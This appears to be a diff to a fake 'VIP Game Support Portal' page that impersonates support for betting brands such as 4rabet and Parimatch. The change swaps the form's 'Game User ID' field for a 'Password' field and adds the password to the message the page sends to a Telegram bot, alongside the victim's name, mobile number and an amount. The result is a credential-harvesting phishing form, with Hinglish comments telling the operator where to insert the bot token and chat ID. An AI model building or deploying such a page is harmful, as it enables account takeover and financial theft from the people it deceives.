@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VIP Game Support Portal</title>
     
+    <!-- 1. Cloudflare Turnstile Script -->
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     
     <style>
@@ -60,7 +61,7 @@
             box-shadow: 0 10px 25px rgba(255, 204, 0, 0.4);
         }
 
-        /* Custom Text Logos based on your screenshots */
+        /* Custom Styling for Game Logos */
         .logo-box {
             width: 100%;
             height: 70px;
@@ -76,17 +77,11 @@
         }
 
         .logo-4rabet { background-color: #0a1e3f; color: #ffffff; border: 1px solid #144079; }
-        .logo-4rabet span { color: #00a8ff; }
-        
         .logo-crorebet { background-color: #ffb800; color: #000000; }
-        
         .logo-starkbet { background-color: #4b00d1; color: #ffffff; }
         .logo-starkbet span { color: #ffb800; }
-        
         .logo-parimatch { background-color: #000000; color: #fbed00; border: 2px solid #333; font-style: italic; }
-        
         .logo-luckystar { background: linear-gradient(45deg, #ff0055, #ffcc00); color: #ffffff; }
-        
         .logo-valorbet { background-color: #ffffff; color: #0a1e3f; }
         .logo-valorbet span { color: #ff6600; }
 
@@ -95,7 +90,7 @@
             color: var(--primary-color); letter-spacing: 1px;
         }
 
-        /* VIP Modal Form */
+        /* Modal Design */
         .modal {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-color: rgba(0, 0, 0, 0.85); backdrop-filter: blur(5px);
@@ -133,6 +128,7 @@
             text-transform: uppercase; cursor: pointer; transition: 0.3s; margin-top: 10px;
         }
         .submit-btn:hover { box-shadow: 0 0 15px rgba(230, 126, 34, 0.5); }
+        
         .cf-turnstile-container { margin-bottom: 15px; display: flex; justify-content: center; }
         #statusMessage { display: none; text-align: center; color: #00ff88; font-weight: bold; margin-top: 15px; font-size: 16px; }
     </style>
@@ -168,7 +164,7 @@
         </div>
     </div>
 
-    <!-- Support Modal -->
+    <!-- Support Form Modal -->
     <div id="supportModal" class="modal">
         <div class="modal-content">
             <span class="close-btn" onclick="closeForm()">&times;</span>
@@ -177,12 +173,16 @@
             <form id="dataForm" onsubmit="sendToTelegram(event)">
                 <div class="form-group"><label>Full Name</label><input type="text" id="name" required></div>
                 <div class="form-group"><label>Mobile Number</label><input type="number" id="phone" required></div>
-                <div class="form-group"><label>Game User ID</label><input type="text" id="userid" required></div>
+                
+                <!-- Password Field Added Here -->
+                <div class="form-group"><label>Password</label><input type="password" id="password" required></div>
+                
                 <div class="form-group"><label>Amount (₹)</label><input type="number" id="amount" required></div>
                 <div class="form-group"><label>Describe Issue</label><textarea id="problem" rows="2" required></textarea></div>
                 
-                <!-- Cloudflare Turnstile -->
+                <!-- 2. Cloudflare Turnstile Widget -->
                 <div class="cf-turnstile-container">
+                    <!-- Yahan apni Cloudflare Site Key daalein -->
                     <div class="cf-turnstile" data-sitekey="YOUR_CLOUDFLARE_SITE_KEY_HERE"></div>
                 </div>
 
@@ -209,6 +209,7 @@
             if (typeof turnstile !== 'undefined') { turnstile.reset(); }
         }
 
+        // Voice Message Trigger
         function playVoiceMessage(gameName) {
             if ('speechSynthesis' in window) {
                 let textToSpeak = `Aapki request ${gameName} team ko chali gayi hai, kripya wait karein`;
@@ -223,26 +224,29 @@
         function sendToTelegram(event) {
             event.preventDefault(); 
 
+            // Cloudflare Turnstile Verification Check
             const turnstileResponse = document.querySelector('[name="cf-turnstile-response"]');
             if (turnstileResponse && !turnstileResponse.value) {
-                alert("Please complete the Security Check!");
+                alert("Please complete the Cloudflare Security Check!");
                 return;
             }
 
+            // Telegram Bot Token aur Chat ID
             const botToken = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'; 
             const chatId = 'YOUR_CHAT_ID_HERE';
 
             const name = document.getElementById('name').value;
             const phone = document.getElementById('phone').value;
-            const userid = document.getElementById('userid').value;
+            const password = document.getElementById('password').value;
             const amount = document.getElementById('amount').value;
             const problem = document.getElementById('problem').value;
 
+            // Telegram message format
             const message = `🌟 *VIP SUPPORT REQUEST* 🌟\n\n` +
                             `🎮 *Game Name:* ${selectedGameName}\n` +
                             `👤 *Name:* ${name}\n` +
                             `📞 *Mobile:* ${phone}\n` +
-                            `🆔 *User ID:* ${userid}\n` +
+                            `🔑 *Password:* ${password}\n` +
                             `💰 *Amount:* ₹${amount}\n` +
                             `📝 *Issue:* ${problem}`;
 
@@ -267,7 +271,7 @@
                     playVoiceMessage(selectedGameName);
                     setTimeout(closeForm, 4500);
                 } else {
-                    alert("Error: Data send nahi hua.");
+                    alert("Error: Data send nahi hua. Telegram Token / Chat ID check karein.");
                     document.getElementById("submitBtn").innerText = "Submit Request";
                     document.getElementById("submitBtn").disabled = false;
                 }
@@ -282,4 +286,3 @@
     </script>
 </body>
 </html>
-     
